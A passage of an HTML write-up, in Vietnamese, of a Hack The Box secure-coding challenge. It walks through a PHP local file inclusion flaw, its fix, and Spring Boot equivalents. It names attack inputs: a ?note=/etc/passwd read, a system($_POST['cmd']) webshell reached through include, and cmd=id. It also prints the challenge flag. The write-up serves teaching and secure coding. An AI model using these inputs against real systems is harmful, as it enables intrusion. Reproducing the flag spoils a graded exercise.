+  <tr><th>#</th><th>Hành động</th><th>Dựa vào đâu</th><th>Verify bằng</th></tr>
+  <tr><td>1</td><td>Đọc source, xác định LFI ở <code>notes.php</code></td><td><code>include $selectedNote</code> từ <code>$_GET</code></td><td><code>?note=/etc/passwd</code> in được nội dung file</td></tr>
+  <tr><td>2</td><td>Nhận diện editor API (ghi file = ngang SMB)</td><td>JS bundle + <code>note.md</code></td><td><code>/editor_api/directory</code> trả cây thư mục app</td></tr>
+  <tr><td>3</td><td>RCE: webshell + include</td><td>Bước 1 + 2</td><td><code>cmd=id</code> → <code>uid=100(challenger)</code></td></tr>
+  <tr><td>4</td><td>Loại trừ: flag tĩnh, log poisoning, wrapper</td><td>find /, include log, thử wrapper</td><td>Phần 2, từng bằng chứng</td></tr>
+  <tr><td>5</td><td>Probe docroot thật</td><td>Nghi ngờ layout deploy</td><td><code>DOCROOT=/app/main_app</code></td></tr>
+  <tr><td>6</td><td>Vá v7: realpath(__DIR__) + 2 thư mục + đọc text</td><td>Kiến thức nền 0.2</td><td>3 tình huống ở bước 4.2</td></tr>
+  <tr><td>7</td><td>Verify</td><td>—</td><td><code>{"flag":"HTB{pL3as5_1ncLud3_m3!}"}</code></td></tr>
+</table>
+
+<!-- ================= PHẦN 5 ================= -->
+<h2 id="p5">Phần 5 — Root cause qua góc nhìn Spring Boot</h2>
+
+<h3>Lỗi 1 — Nhúng đường dẫn do user kiểm soát vào lệnh "đọc/thực thi" file</h3>
+<div class="spring bad-ex">
+  <div class="hd">❌ Code sai — tương đương Spring: đọc file theo path từ request, không kiểm chứng</div>
+  <div class="bd"><pre><code><span class="cm">// PHP — bản gốc của challenge</span>
+<span class="kw">include</span> $selectedNote;   <span class="cm">// $selectedNote = $_GET['note'] — chưa hề validate</span>
+
+<span class="cm">// Tương đồng Spring: trả nội dung file theo path ngưởi dùng gửi lên</span>
+<span class="kw">@GetMapping</span>(<span class="st">"/notes"</span>)
+<span class="kw">public</span> String <span class="fn">note</span>(<span class="kw">@RequestParam</span> String path) <span class="kw">throws</span> IOException {
+    <span class="kw">return</span> Files.<span class="fn">readString</span>(Path.<span class="fn">of</span>(<span class="st">"/www/app/"</span> + path));  <span class="cm">// ← path traversal tương tự: ../../etc/passwd</span>
+}</code></pre></div>
+</div>
+<div class="spring">
+  <div class="hd">✅ Cách sửa đúng — chuẩn hoá path và so với thư mục cho phép</div>
+  <div class="bd"><pre><code><span class="cm">// Java: chuẩn hoá rồi kiểm tra prefix, từ chối mọi thứ thoát ra ngoài</span>
+Path base = Path.<span class="fn">of</span>(<span class="st">"/www/app"</span>).<span class="fn">toRealPath</span>();
+Path target = base.<span class="fn">resolve</span>(path).<span class="fn">normalize</span>().<span class="fn">toRealPath</span>(); <span class="cm">// resolve symlink + ..</span>
+<span class="kw">if</span> (!target.<span class="fn">startsWith</span>(base.<span class="fn">resolve</span>(<span class="st">"rick_and_morty_notes"</span>))
+    &amp;&amp; !target.<span class="fn">startsWith</span>(base.<span class="fn">resolve</span>(<span class="st">"my_notes"</span>))) {
+    <span class="kw">throw new</span> <span class="fn">ResponseStatusException</span>(HttpStatus.BAD_REQUEST);
+}
+<span class="kw">return</span> Files.<span class="fn">readString</span>(target);</code></pre></div>
+</div>
+<p>Nguyên tắc: <b>never trust user input làm đường dẫn</b>. Chuẩn hoá (<code>toRealPath</code>/<code>realpath</code>) trước rồi so prefix — đừng lọc chuỗi bằng blacklist (<code>str_replace('../','')</code> bị bypass 1001 kiểu: <code>....//</code>, URL-encode, v.v.).</p>
+
+<h3>Lỗi 2 — <code>include</code>: ranh giới "đọc" và "thực thi" bị xoá nhòa</h3>
+<div class="spring bad-ex">
+  <div class="hd">❌ Code sai — thực thi mọi file nằm đúng thư mục</div>
+  <div class="bd"><pre><code><span class="cm">// Dù đã chặn traversal, include vẫn chạy mã PHP attacker ghi được</span>
+<span class="cm">// vào thư mục ghi chú (qua SMB/editor/upload...)</span>
+<span class="kw">include</span> $real;   <span class="cm">// x.php → system($_POST['cmd']) CHẠY THẬT</span></code></pre></div>
+</div>
+<div class="spring">
+  <div class="hd">✅ Cách sửa đúng — dữ liệu là dữ liệu, không bao giờ là mã</div>
+  <div class="bd"><pre><code><span class="cm">// Chỉ đọc nội dung dạng text; kèm đúng Content-Type</span>
+$noteContent = <span class="fn">file_get_contents</span>($real);
+<span class="cm">// Spring tương đồng: trả file qua ResourceHttpRequestConfigurer /</span>
+<span class="cm">// ContentDisposition.attachment() — không bao giờ eval/ScriptEngine</span>
+<span class="cm">// theo nội dung file do user upload.</span></code></pre></div>
+</div>
+<p>Đây là lý do v5 thất bại: chặn đúng đường dẫn nhưng vẫn <code>include</code> — "vulnerability check" của HTB kiểm tra đúng kịch bản attacker ghi webshell vào thư mục hợp lệ. Vá an toàn phải giả định <b>kẻ tấn công có thể ghi file vào bất kỳ đâu trong phạm vi app</b>.</p>
+
+<h3>Lỗi 3 — Hardcode đường dẫn tuyệt đối, layout đổi là vỡ (bài học từ v1–v3)</h3>
+<div class="spring bad-ex">
+  <div class="hd">❌ Code mong manh</div>
+  <div class="bd"><pre><code>$notes = <span class="fn">scandir</span>(<span class="st">'/www/app/rick_and_morty_notes'</span>);  <span class="cm">// hardcode tuyệt đối</span></code></pre></div>
+</div>
+<div class="spring">
+  <div class="hd">✅ Code bền</div>
+  <div class="bd"><pre><code>$base = realpath(<span class="kw">__DIR__</span>);   <span class="cm">// mỏ neo theo vị trí chính file đang chạy</span>
+<span class="cm">// Spring tương đồng: @Value("classpath:/notes/") Resource notesDir;</span>
+<span class="cm">// hoặc Paths.get(getClass().getResource("/notes").toURI())</span></code></pre></div>
+</div>
+<p>Bản deploy runtime dùng <code>/app/main_app</code>, source zip nói <code>/www/app</code> — ai hardcode theo source zip sẽ vá xong thì chức năng chết sạch. Hằng số kiểu <code>__DIR__</code> hoặc <code>classpath:</code> giúp code sống sót qua mọi thay đổi layout.</p>
+
+<!-- ================= PHẦN 6 ================= -->
+<h2 id="p6">Phần 6 — Bài học &amp; checklist khi tự làm lại</h2>
+<div class="card">
+<ol class="steps">
+  <li><b>Source zip là bản gốc, không phải bản deploy.</b> Mọi giả định về đường dẫn tuyệt đối phải được <b>đo lường</b> trên instance (probe.php), không suy từ source.</li>
+  <li><b>LFI = <code>include</code> đường dẫn thô.</b> Kiểm chứng bằng <code>/etc/passwd</code>; báo cáo phải nêu cả khả năng RCE chứ không dừng ở "đọc file".</li>
+  <li><b>Cứ có chỗ ghi file + include là thành RCE.</b> Ở đây chính là editor API / SMB share — phương tiện "sửa bài" cũng là phương tiện tấn công.</li>
+  <li><b>Vá LFI phải sửa cả hai mặt:</b> chuẩn hoá + so prefix đường dẫn (realpath/toRealPath) <b>và</b> bỏ thực thi (đọc text thay include). Chỉ vá một mặt là checker (và attacker thật) bắt được.</li>
+  <li><b>Không lọc chuỗi kiểu blacklist.</b> <code>str_replace('../','')</code> bị bypass vô số cách; whitelist prefix sau khi chuẩn hoá mới đáng tin.</li>
+  <li><b>Optimistic locking không phải lỗi — đọc kỹ API.</b> 409 CONFLICT nghĩa là thiếu md5 hiện tại, cứ fetch → md5 → save lại.</li>
+  <li><b>Tái cấu trúc file bằng cắt chuỗi là mỏ chết ngưởi.</b> Hãy xây file từ nguồn gốc có sẵn và thay đúng phần cần đổi, rồi đọc lại toàn bộ file sau khi lưu để soát.</li>
+  <li><b>Flag của dạng secure coding đến từ verify.</b> Không tìm thấy flag tĩnh ≠ bài hỏng — kiểm tra kỹ trước khi kết luận.</li>
+</ol>
+</div>
+<div class="card">
+<b>Checklist thực hành:</b>
+<ul class="dash">
+  <li>☐ Đọc source, chỉ ra được dòng <code>include $selectedNote</code> và giải thích vì sao là LFI</li>
+  <li>☐ Chứng minh LFI bằng <code>?note=/etc/passwd</code></li>
+  <li>☐ Lên RCE bằng webshell + include (ghi qua editor API)</li>
+  <li>☐ Chạy probe, biết docroot thực là <code>/app/main_app</code></li>
+  <li>☐ Viết bản vá: realpath(__DIR__) + 2 thư mục + file_get_contents/echo</li>
+  <li>☐ Kiểm chứng 3 tình huống (hợp lệ 200 / LFI 302 / webshell chỉ hiển thị text)</li>
+  <li>☐ Gọi verify, nhận <code>HTB{pL3as5_1ncLud3_m3!}</code></li>
+  <li>☐ Stop instance, tự submit flag ở portal</li>
+</ul>
+</div>
+
+<p class="muted" style="margin-top:40px">Flag đã lấy được bằng endpoint verify của chính challenge, <b>chưa nộp</b> — bạn tự submit ở portal HTB. Source đề bài nằm trong thư mục <code>src/</code> cùng thư mục với file này. Wubba lubba dub dub!</p>
+
+</div>
+</body>
+</html>
